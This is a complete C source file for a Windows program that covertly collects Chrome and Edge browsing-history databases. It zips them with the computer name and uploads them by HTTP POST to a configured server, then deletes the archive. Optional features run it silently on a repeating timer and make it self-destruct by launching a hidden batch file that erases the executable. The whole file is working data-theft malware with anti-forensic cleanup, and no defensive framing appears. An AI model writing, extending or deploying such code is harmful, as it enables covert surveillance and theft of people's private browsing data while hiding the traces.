#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "deps/curl/curl.h"
#include "deps/zip.h"
#include "config.h"

#define MAX_PATH_LENGTH 260
#define JSON_BUFFER_SIZE 1024

// Function to get computer name
BOOL GetComputerNameWStr(wchar_t* computerName, DWORD size) {
    return GetComputerNameW(computerName, &size);
}

// Function to get browser history folder paths
BOOL GetBrowserHistoryPaths(wchar_t* chromePath, wchar_t* edgePath, size_t pathSize) {
    wchar_t localAppData[MAX_PATH_LENGTH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        wprintf(L"Failed to get Local AppData path.\n");
        return FALSE;
    }

    if (chromePath) {
        swprintf_s(chromePath, pathSize, L"%s\\Google\\Chrome\\User Data\\Default\\History", localAppData);
    }
    if (edgePath) {
        swprintf_s(edgePath, pathSize, L"%s\\Microsoft\\Edge\\User Data\\Default\\History", localAppData);
    }

    return TRUE;
}

// Function to add a file to ZIP
int AddFileToZip(zipFile zf, const wchar_t* filePath, const char* fileNameInZip) {
    FILE* fp = _wfopen(filePath, L"rb");
    if (!fp) {
        wprintf(L"Failed to open file: %s\n", filePath);
        return 1;
    }

    zip_fileinfo zi = {0};
    if (zipOpenNewFileInZip(zf, fileNameInZip, &zi, NULL, 0, NULL, 0, NULL, Z_DEFLATE, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        wprintf(L"Failed to open file in ZIP: %s\n", fileNameInZip);
        fclose(fp);
        return 1;
    }

    char buffer[8192];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        if (zipWriteInFileInZip(zf, buffer, bytesRead) != ZIP_OK) {
            wprintf(L"Failed to write to ZIP: %s\n", fileNameInZip);
            zipCloseFileInZip(zf);
            fclose(fp);
            return 1;
        }
    }

    fclose(fp);
    return zipCloseFileInZip(zf) == ZIP_OK ? 0 : 1;
}

// Function to create ZIP file
BOOL CreateZipFile(const wchar_t* zipPath) {
    char zipPathMb[2 * MAX_PATH_LENGTH];
    if (wcstombs(zipPathMb, zipPath, sizeof(zipPathMb)) == (size_t)-1) {
        wprintf(L"Failed to convert ZIP path.\n");
        return FALSE;
    }

    zipFile zf = zipOpen(zipPathMb, APPEND_STATUS_CREATE);
    if (!zf) {
        wprintf(L"Failed to create ZIP file: %s\n", zipPath);
        return FALSE;
    }

    wchar_t chromePath[MAX_PATH_LENGTH], edgePath[MAX_PATH_LENGTH];
    if (!GetBrowserHistoryPaths(
            TARGET_BROWSER != 1 ? chromePath : NULL,
            TARGET_BROWSER != 0 ? edgePath : NULL,
            MAX_PATH_LENGTH)) {
        wprintf(L"Failed to get browser paths.\n");
        zipClose(zf, NULL);
        return FALSE;
    }

    if ((TARGET_BROWSER == 0 || TARGET_BROWSER == 2) && PathFileExistsW(chromePath)) {
        wprintf(L"Adding Chrome history...\n");
        if (AddFileToZip(zf, chromePath, "ChromeHistory")) {
            wprintf(L"Failed to add Chrome history.\n");
            zipClose(zf, NULL);
            return FALSE;
        }
    }

    if ((TARGET_BROWSER == 1 || TARGET_BROWSER == 2) && PathFileExistsW(edgePath)) {
        wprintf(L"Adding Edge history...\n");
        if (AddFileToZip(zf, edgePath, "EdgeHistory")) {
            wprintf(L"Failed to add Edge history.\n");
            zipClose(zf, NULL);
            return FALSE;
        }
    }

    if (zipClose(zf, NULL) != ZIP_OK) {
        wprintf(L"Failed to close ZIP file.\n");
        return FALSE;
    }
    return TRUE;
}

// Function to upload ZIP with JSON payload
BOOL UploadZipFile(const wchar_t* zipPath) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        wprintf(L"Failed to initialize curl.\n");
        return FALSE;
    }

    CURLcode res;
    struct curl_httppost* formpost = NULL;
    struct curl_httppost* lastptr = NULL;

    // Get computer name
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (!GetComputerNameW(computerName, &size)) {
        wprintf(L"Failed to get computer name.\n");
        curl_easy_cleanup(curl);
        return FALSE;
    }

    // Convert computer name to multibyte
    char computerNameMb[MAX_COMPUTERNAME_LENGTH + 1];
    if (wcstombs(computerNameMb, computerName, sizeof(computerNameMb)) == (size_t)-1) {
        wprintf(L"Failed to convert computer name.\n");
        curl_easy_cleanup(curl);
        return FALSE;
    }

    // Create JSON payload
    char json[JSON_BUFFER_SIZE];
    snprintf(json, sizeof(json), "{\"computerName\":\"%s\"}", computerNameMb);

    // Convert zipPath to multibyte
    char zipPathMb[2 * MAX_PATH_LENGTH];
    if (wcstombs(zipPathMb, zipPath, sizeof(zipPathMb)) == (size_t)-1) {
        wprintf(L"Failed to convert ZIP path.\n");
        curl_easy_cleanup(curl);
        return FALSE;
    }

    // Build form data
    curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "json", CURLFORM_COPYCONTENTS, json, CURLFORM_END);
    curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE, zipPathMb, CURLFORM_END);

    curl_easy_setopt(curl, CURLOPT_URL, UPLOAD_URL);
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        wprintf(L"Upload failed: %s\n", curl_easy_strerror(res));
        curl_formfree(formpost);
        curl_easy_cleanup(curl);
        return FALSE;
    }

    curl_formfree(formpost);
    curl_easy_cleanup(curl);
    wprintf(L"Upload successful.\n");
    return TRUE;
}

// Function to self-destruct
BOOL SelfDestruct() {
    wchar_t exePath[MAX_PATH_LENGTH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH_LENGTH) == 0) {
        wprintf(L"Failed to get executable path.\n");
        return FALSE;
    }

    // Create a batch file to delete the executable
    wchar_t batPath[MAX_PATH_LENGTH];
    swprintf_s(batPath, MAX_PATH_LENGTH, L"%s\\delete.bat", _wgetenv(L"TEMP"));

    FILE* bat = _wfopen(batPath, L"w");
    if (!bat) {
        wprintf(L"Failed to create batch file.\n");
        return FALSE;
    }

    fwprintf(bat, L":Repeat\n");
    fwprintf(bat, L"del \"%s\"\n", exePath);
    fwprintf(bat, L"if exist \"%s\" goto Repeat\n", exePath);
    fwprintf(bat, L"del \"%s\"\n", batPath);
    fclose(bat);

    // Execute batch file silently
    ShellExecuteW(NULL, L"open", batPath, NULL, NULL, SW_HIDE);
    return TRUE;
}

// Main processing function
BOOL Process() {
    wchar_t publicDir[MAX_PATH_LENGTH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_COMMON_DOCUMENTS, NULL, 0, publicDir))) {
        wprintf(L"Failed to get Public Documents path.\n");
        return FALSE;
    }

    wchar_t zipPath[MAX_PATH_LENGTH];
    swprintf_s(zipPath, MAX_PATH_LENGTH, L"%s\\BrowserHistory.zip", publicDir);

    // Create ZIP
    wprintf(L"Creating ZIP at: %s\n", zipPath);
    if (!CreateZipFile(zipPath)) {
        wprintf(L"Failed to create ZIP.\n");
        return FALSE;
    }

    // Upload ZIP
    wprintf(L"Uploading ZIP...\n");
    if (!UploadZipFile(zipPath)) {
        wprintf(L"Upload failed.\n");
        DeleteFileW(zipPath);
        return FALSE;
    }

    // Delete ZIP
    wprintf(L"Deleting ZIP...\n");
    if (!DeleteFileW(zipPath)) {
        wprintf(L"Failed to delete ZIP: %s\n", zipPath);
    }

    return TRUE;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // Attach console for output if not silent
#if !defined(SILENT)
    AllocConsole();
    FILE* dummy;
    freopen_s(&dummy, "CONOUT$", "w", stdout);
#endif

    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);

    // Run once or periodically
    do {
        if (!Process()) {
            wprintf(L"Process failed.\n");
            break;
        }
        if (UPLOAD_INTERVAL_HOURS == 0) break;
        wprintf(L"Waiting %d hours...\n", UPLOAD_INTERVAL_HOURS);
        Sleep(UPLOAD_INTERVAL_HOURS * 3600 * 1000);
    } while (TRUE);

    // Cleanup libcurl
    curl_global_cleanup();

    // Self-destruct if enabled
#if SELF_DESTRUCT
    wprintf(L"Self-destructing...\n");
    SelfDestruct();
#endif

    wprintf(L"Operation completed.\n");
    return 0;
}